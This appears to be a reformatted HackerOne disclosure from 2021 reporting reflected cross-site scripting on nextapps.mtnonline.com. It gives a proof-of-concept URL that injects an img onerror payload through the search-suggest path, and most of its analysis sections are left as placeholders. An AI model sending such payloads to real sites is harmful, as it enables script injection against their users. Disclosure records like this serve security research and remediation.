# XSS at http://nextapps.mtnonline.com/search/suggest/q/{xss payload}

## Metadata
- **Source:** HackerOne
- **Report:** 1244722 | https://hackerone.com/reports/1244722
- **Submitted:** 2021-06-25
- **Reporter:** homosec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
PoC
```
http://nextapps.mtnonline.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```
Symbols <'/"> are no filtered that alloweds to inject HTML code. Response has content-type: text/html
{F1353600}

## Impact

XSS at nextapps.mtnonline.com

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

PoC
```
http://nextapps.mtnonline.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```
Symbols <'/"> are no filtered that alloweds to inject HTML code. Response has content-type: text/html
{F1353600}

## Impact

XSS at nextapps.mtnonline.com

</details>

---
*Analysed by Claude on 2026-05-24*
